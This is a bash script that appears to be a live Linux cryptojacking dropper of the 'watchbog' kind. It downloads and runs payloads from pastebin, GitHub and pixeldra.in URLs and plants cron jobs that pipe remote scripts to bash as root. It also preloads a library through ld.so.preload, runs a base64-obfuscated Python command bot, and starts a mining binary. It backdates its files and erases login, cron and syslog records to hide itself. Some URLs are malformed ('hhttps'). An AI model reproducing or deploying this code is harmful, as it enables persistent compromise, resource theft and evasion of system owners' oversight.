#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
#This is the RED_DAY job copy

function system() {
	rm -rf /bin/httpsntp bin/ftpsntp
	grep -v "/bin/httpsntp" /etc/crontab > /etc/crontab.bak && mv /etc/crontab.bak /etc/crontab
	if [ ! -f "/bin/httpsntp" ]; then
		curl -fsSL https://pastebin.com/raw/EpLA3n3P -o /bin/httpsntp && chmod 755 /bin/httpsntp
		if [ ! -f "/bin/httpsntp" ]; then
			wget  https://pastebin.com/raw/EpLA3n3P -O /bin/httpsntp && chmod 755 /bin/httpsntp
		fi
		if [ ! -f "/etc/crontab" ]; then
			echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /bin/httpsntp\n##" >> /etc/crontab
		else
			echo -e "0 1 * * * root /bin/httpsntp\n##" >> /etc/crontab
		fi
	fi
	grep -v "/bin/ftpsntp" /etc/crontab > /etc/crontab.bak && mv /etc/crontab.bak /etc/crontab
	if [ ! -f "/bin/ftpsntp" ]; then
		curl -fsSL https://pastebin.com/raw/6BEhQnYW -o /bin/ftpsntp && chmod 755 /bin/ftpsntp
		if [ ! -f "/bin/ftpsntp" ]; then
			wget  https://pastebin.com/raw/6BEhQnYW -O /bin/httpsntp && chmod 755 /bin/ftpsntp
		fi
		if [ ! -f "/etc/crontab" ]; then
			echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n5 1 * * * root /bin/ftpsntp\n##" >> /etc/crontab
		else
			echo -e "5 1 * * * root /bin/ftpsntp" >> /etc/crontab
		fi
	fi
}

function library() {
	mkdir -p mkdir -p /usr/local/lib/
	ARCH=$(uname -i)
	ARC=$(uname -m)
	if [ "$ARCH" == "x86_64" ]; then
		URL="https://raw.githubusercontent.com/blur98/Forever/master/record/lib64"
	elif [ "$ARCH" == "i386" ]; then
		URL="https://raw.githubusercontent.com/blur98/Forever/master/record/lib32"
	elif [ "$ARC" == "x86_64" ]; then
		URL="https://raw.githubusercontent.com/blur98/Forever/master/record/lib64"
	elif [ "$ARC" == "i686" ]; then
		URL="https://raw.githubusercontent.com/blur98/Forever/master/record/lib32"
	else
		echo "Sorry Boss"
	fi
	curl -fsSL $URL -o /usr/local/lib/libntpd.so && chmod 755 /usr/local/lib/libntpd.so
	if [ ! -f "/var/tmp/systemd-private-xfjdhdicjijo473skiosoohxiskl573q-systemd-timesync.serviced-g1A5qf/cred/fghhhh/data/oldlady" ]; then
		wget $URL -O /usr/local/lib/libntpd.so && chmod 755 /usr/local/lib/libntpd.so
	fi
	if [ ! -f "/etc/ld.so.preload" ]; then
		echo /usr/local/lib/libntp.so > /etc/ld.so.preload
	else
		sed -i '$d' /etc/ld.so.preload && echo /usr/local/lib/libntp.so >> /etc/ld.so.preload
	fi
	touch -acmr /bin/sh /etc/ld.so.preload
	touch -acmr /bin/sh /usr/local/lib/libntp.so
}

function dragon() {
	nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKI3NpbXBsZSBodHRwX2JvdAppbXBvcnQgdXJsbGliCmltcG9ydCBiYXNlNjQKaW1wb3J0IG9zCgpkZWYgc29zKCk6CiAgICB1cmwgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzA1cDBmVFlkJwogICAgdHJ5OgogICAgICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3Blbih1cmwpLnJlYWQoKSkKICAgICAgICBmID0gb3MucG9wZW4oc3RyKHBhZ2UpKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KCdmYWlsZWQgdG8gZXhlY3V0ZSBvcyBjb21tYW5kJykKICAgICAgICBwYXNzCgpkZWYgcnVuU2NyaXB0KCk6CiAgICB1cmwgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0t4V1BGZUVuJwogICAgdHJ5OgogICAgICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3Blbih1cmwpLnJlYWQoKSkKICAgICAgICBleGVjKHBhZ2UpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoJ2ZhaWxlZCB0byBleGVjdXRlIG9zIHB5dGhvbiBzY3JpcHQnKQogICAgICAgIHBhc3MKCmQ9ICdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvWDZ3dnV2OTgnCnRyeToKICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3BlbihkKS5yZWFkKCkpCiAgICBpZiBwYWdlID09ICdvcyc6CiAgICAgICAgc29zKCkKICAgIGVsaWYgcGFnZSA9PSAnc2NyaXB0JzoKICAgICAgICBydW5TY3JpcHQoKQogICAgZWxzZToKICAgICAgICBwcmludCgnSSBjYW5cJ3QgdW5kZXJzdGFuZCB0aGUgYWN0aW9uIGFtIGdpdmVuJykKZXhjZXB0OgogICAgcHJpbnQoJ1NvcnJ5IGJvc3MgSSBjYW5cJ3QgZ2V0IGluc3RydWN0aW9ucycpCiAgICBwYXNzCg=='))" >/dev/null 2>&1 &
	touch /tmp/.tmpza
}

function spreada() {
	touch /tmp/.tmpold
	path1="/var/tmp/systemd-private-xfjdhdicjijo473skiosoohxiskl573q-systemd-timesync.serviced-g1A5qf/cred/fghhhh/data"
	path2="/var/tmp/systemd-private-xfjdhdicjijo473skiosoohxiskl573q-systemd-timesync.serviced-g1A5qf/cred/fghhhh/data/dropout/"
	mkdir -p $path1
	mkdir -p $path2
	ARCH=$(uname -i)
	ARC=$(uname -m)
	if [ "$ARCH" == "x86_64" ]; then
		URL="https://raw.githubusercontent.com/goat56/young_stud/master/oldstuff/oldlady2"
	elif [ "$ARCH" == "i386" ]; then
		URL="https://raw.githubusercontent.com/goat56/young_stud/master/oldstuff/oldlady"
	elif [ "$ARC" == "x86_64" ]; then
		URL="https://raw.githubusercontent.com/goat56/young_stud/master/oldstuff/oldlady2"
	elif [ "$ARC" == "i686" ]; then
		URL="https://raw.githubusercontent.com/goat56/young_stud/master/oldstuff/oldlady"
	else
		touch /tmp/.finished
		exit 0
	fi
	curl -fsSL $URL -o $path1/oldlady && chmod 777 $path1/oldlady
	if [ ! -f "/var/tmp/systemd-private-xfjdhdicjijo473skiosoohxiskl573q-systemd-timesync.serviced-g1A5qf/cred/fghhhh/data/oldlady" ]; then
		wget $URL -O $path1/oldlady && chmod 777 $path1/oldlady
	fi
	cd $path1
	nohup ./oldlady >/dev/null 2>&1 &
}

function cronhigh() {
	chattr -i /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root
	rm -rf /etc/cron.hourly/oanacrona /etc/cron.daily/oanacrona /etc/cron.monthly/oanacrona
	echo -e "*/3 * * * * root (curl -fsSL https://pastebin.com/raw/EpLA3n3P||wget -q -O- https://pastebin.com/raw/EpLA3n3P||python -c 'import urllib2 as fbi;print fbi.urlopen(\"https://pastebin.com/raw/GztXu4w5\").read()')|bash\n##" > /etc/cron.d/root
	echo -e "*/6 * * * * root (curl -fsSL https://pastebin.com/raw/EpLA3n3P||wget -q -O- https://pastebin.com/raw/EpLA3n3P||python -c 'import urllib2 as fbi;print fbi.urlopen(\"https://pastebin.com/raw/GztXu4w5\").read()')|bash\n##" > /etc/cron.d/system
	echo -e "*/7 * * * * root (curl -fsSL https://pastebin.com/raw/EpLA3n3P||wget -q -O- https://pastebin.com/raw/EpLA3n3P||python -c 'import urllib2 as fbi;print fbi.urlopen(\"https://pastebin.com/raw/GztXu4w5\").read()')|bash\n##" > /etc/cron.d/apache
	echo -e "*/9 * * * * (curl -fsSL https://pastebin.com/raw/EpLA3n3P||wget -q -O- https://pastebin.com/raw/EpLA3n3P||python -c 'import urllib2 as fbi;print fbi.urlopen(\"https://pastebin.com/raw/GztXu4w5\").read()')|bash\n##" > /var/spool/cron/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/11 * * * * (curl -fsSL https://pastebin.com/raw/EpLA3n3P||wget -q -O- https://pastebin.com/raw/EpLA3n3P||python -c 'import urllib2 as fbi;print fbi.urlopen(\"https://pastebin.com/raw/GztXu4w5\").read()')|bash\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.hourly
	curl -fsSL https://pastebin.com/raw/EpLA3n3P -o /etc/cron.hourly/oanacrona && chmod 755 /etc/cron.hourly/oanacrona
	if [ ! -f "/etc/cron.hourly/oanacrona" ]; then
		wget https://pastebin.com/raw/EpLA3n3P -O /etc/cron.hourly/oanacrona && chmod 755 /etc/cron.hourly/oanacrona
	fi
	mkdir -p /etc/cron.daily
	curl -fsSL https://pastebin.com/raw/EpLA3n3P -o /etc/cron.daily/oanacrona && chmod 755 /etc/cron.daily/oanacrona
	if [ ! -f "/etc/cron.daily/oanacrona" ]; then
		wget https://pastebin.com/raw/EpLA3n3P -O /etc/cron.daily/oanacrona && chmod 755 /etc/cron.daily/oanacrona
	fi
	mkdir -p /etc/cron.monthly
	curl -fsSL https://pastebin.com/raw/EpLA3n3P -o /etc/cron.monthly/oanacrona && chmod 755 /etc/cron.monthly/oanacrona
	if [ ! -f "/etc/cron.monthly/oanacrona" ]; then
		wget https://pastebin.com/raw/EpLA3n3P -O /etc/cron.monthly/oanacrona && chmod 755 /etc/cron.monthly/oanacrona
	fi
	touch -acmr /bin/sh /var/spool/cron/root
	touch -acmr /bin/sh /var/spool/cron/crontabs/root
	touch -acmr /bin/sh /etc/cron.d/system
	touch -acmr /bin/sh /etc/cron.d/apache
	touch -acmr /bin/sh /etc/cron.d/root
	touch -acmr /bin/sh /etc/cron.hourly/oanacrona
	touch -acmr /bin/sh /etc/cron.daily/oanacrona
	touch -acmr /bin/sh /etc/cron.monthly/oanacrona
}

function downloadlow() {
	pa=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	if [ ${pa} -eq 0 ];then
		mkdir -p /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
		if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/config.json" ]; then
			curl -fsSL https://pixeldra.in/api/download/wGks80 -o /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/config.json && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/config.json
			if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/config.json" ]; then
				wget https://pixeldra.in/api/download/wGks80 -O /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/config.json && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/config.json
			fi
		fi
		ARCH=$(uname -m)
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog" ]; then
				curl -fsSL https://pixeldra.in/api/download/KcvjNP -o /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog
				if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog" ]; then
					wget https://pixeldra.in/api/download/KcvjNP -O /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog
				fi
				cd /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		elif [ "$ARCH" == "i686" ]; then
			if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog" ]; then
				curl -fsSL hhttps://pixeldra.in/api/download/nZ2s4L -o /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog
				if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog" ]; then
					wget hhttps://pixeldra.in/api/download/nZ2s4L -O /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog
				fi
				cd /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		else
			if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog" ]; then
				curl -fsSL hhttps://pixeldra.in/api/download/nZ2s4L -o /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog
				if [ ! -f "/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog" ]; then
					wget hhttps://pixeldra.in/api/download/nZ2s4L -O /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog && chmod 777 /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog
				fi
				cd /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		fi
	fi
}

function downloadhigh() {
	pb=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	if [ ${pb} -eq 0 ];then
		echo 128 > /proc/sys/vm/nr_hugepages
		sysctl -w vm.nr_hugepages=128
		rm -rf /usr/share/watchbog/*
		mkdir -p /usr/share/watchbog/
		if [ ! -f "/usr/share/watchbog/config.json" ]; then
			curl -fsSL https://pixeldra.in/api/download/wGks80 -o /usr/share/watchbog/config.json && chmod 777 /usr/share/watchbog/config.json
			if [ ! -f "/usr/share/watchbog/config.json" ]; then
				wget https://pixeldra.in/api/download/wGks80 -O /usr/share/watchbog/config.json && chmod 777 /usr/share/watchbog/config.json
			fi
		fi
		ARCH=$(uname -m)
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "/usr/share/watchbog/watchbog" ]; then
				curl -fsSL https://pixeldra.in/api/download/KcvjNP -o /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				if [ ! -f "/usr/share/watchbog/watchbog" ]; then
					wget https://pixeldra.in/api/download/KcvjNP -O /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				fi
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		elif [ "$ARCH" == "i686" ]; then
			if [ ! -f "/usr/share/watchbog/watchbog" ]; then
				curl -fsSL hhttps://pixeldra.in/api/download/nZ2s4L -o /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				if [ ! -f "/usr/share/watchbog/watchbog" ]; then
					wget hhttps://pixeldra.in/api/download/nZ2s4L -O /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				fi
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		else
			if [ ! -f "/usr/share/watchbog/watchbog" ]; then
				curl -fsSL hhttps://pixeldra.in/api/download/nZ2s4L -o /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				if [ ! -f "/usr/share/watchbog/watchbog" ]; then
					wget hhttps://pixeldra.in/api/download/nZ2s4L -O /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				fi
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		fi
	fi
}

function testhigh() {
	pb=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	rm -rf /usr/share/watchbog/*
	mkdir -p /usr/share/watchbog/
	if [ ${pb} -eq 0 ];then
		rm -rf /bin/watchbog /bin/config.json
		if [ ! -f "/usr/share/watchbog/config.txt" ]; then
			curl -fsSL https://pixeldra.in/api/download/mVZwTD -o /usr/share/watchbog/config.txt && chmod 777 /usr/share/watchbog/config.txt
			if [ ! -f "/usr/share/watchbog/config.txt" ]; then
				wget https://pixeldra.in/api/download/mVZwTD -O /usr/share/watchbog/config.txt && chmod 777 /usr/share/watchbog/config.txt
			fi
		fi
		if [ ! -f "/usr/share/watchbog/cpu.txt" ]; then
			curl -fsSL https://pixeldra.in/api/download/uwyB-b -o /usr/share/watchbog/cpu.txt && chmod 777 /usr/share/watchbog/cpu.txt
			if [ ! -f "/usr/share/watchbog/cpu.txt" ]; then
				wget https://pixeldra.in/api/download/uwyB-b -O /usr/share/watchbog/cpu.txt && chmod 777 /usr/share/watchbog/cpu.txt
			fi
		fi
		if [ ! -f "/usr/share/watchbog/pools.txt" ]; then
			curl -fsSL https://pixeldra.in/api/download/Ct7E7M -o /usr/share/watchbog/pools.txt && chmod 777 /usr/share/watchbog/pools.txt
			if [ ! -f "/usr/share/watchbog/pools.txt" ]; then
				wget https://pixeldra.in/api/download/Ct7E7M -O /usr/share/watchbog/pools.txt && chmod 777 /usr/share/watchbog/pools.txt
			fi
		fi
		ARCH=$(uname -m)
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "/usr/share/watchbog/watchbog" ]; then
				curl -fsSL https://pixeldra.in/api/download/gJirNU -o /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				if [ ! -f "/usr/share/watchbog/watchbog" ]; then
					wget https://pixeldra.in/api/download/gJirNU -O /usr/share/watchbog/watchbog && chmod 777 /usr/share/watchbog/watchbog
				fi
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			else
				cd /usr/share/watchbog/
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		else
			rm -rf /usr/share/watchbog/* 
		fi
	fi
}

function successhigh() {
	(curl -fsSL https://pastebin.com/raw/rf9GdGBe || wget -q -O - https://pastebin.com/raw/rf9GdGBe)
	touch /tmp/.tmpc
}	

function successlow() {
	(curl -fsSL https://pastebin.com/raw/J4Wkx2Ue || wget -q -O - https://pastebin.com/raw/J4Wkx2Ue)
	touch /tmp/.tmpc
}

function clearup() {
	echo 0>/var/spool/mail/root
	echo 0>/var/log/wtmp
	echo 0>/var/log/secure
	echo 0>/var/log/cron
	sed -i '/pastebin/d' /var/log/syslog
	sed -i '/github/d' /var/log/syslog
	echo 0>/var/spool/mail/root
}

update=$( (curl -fsSL --max-time 120 https://pastebin.com/raw/2unJiD3b || wget -q -O - https://pastebin.com/raw/2unJiD3b) )
if [ "$update" == "update"x ];then
	echo "An update exists boss"
	rm -rf /tmp/.tmpk
	if [ ! -f "/tmp/.tmpold" ]; then
		spreada
	fi
else
	echo "NO update exists boss"
fi
BS=$( whoami )
echo "I am $BS"
if [ "$BS" == "root" ];then
	ps -fe|grep 'watchbog'|grep -v grep|wc -l
	if [ $? -ne 0 ];then
		echo "It's running boss"
		system
		cronhigh
		clearup
		if [ ! -f "/usr/local/lib/libntpd.so" ]; then
			echo "library"
		fi
	else
		system
		cronhigh
		if [ ! -f "/usr/local/lib/libntpd.so" ]; then
			echo "library"
		fi
		downloadhigh
		sleep 15
		pm=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
		if [ ${pm} -ne 0 ];then
			if [ ! -f "/tmp/.tmpc" ]; then
				successhigh
			fi
		fi
		sleep 30
		if [ ${pm} -eq 0 ];then
			testhigh
			if [ ${pm} -ne 0 ];then
				successhigh
			fi
		fi
		if [ ${pm} -eq 0 ];then
			downloadlow
			if [ ${pm} -ne 0 ];then
				successlow
			fi
		fi
		
	fi
	clearup
fi
#
clearup
#
if [ -f "/tmp/.spread" ]; then
	rm -rf /tmp/.spread
	rm -rf /tmp/.tmpupdateaa
	pkill -f RED
	pkill -f relax
	pkill -f TnF
	rm -rf /opt/test/
	rm -rf /tmp/.finished
	rm -rf /var/tmp/systemd-private-xfjdhdicjijo473skiosoohxiskl573q-systemd-timesync.serviced-g1g5qf/cred/fghhhh/data/
fi
#
clearup
#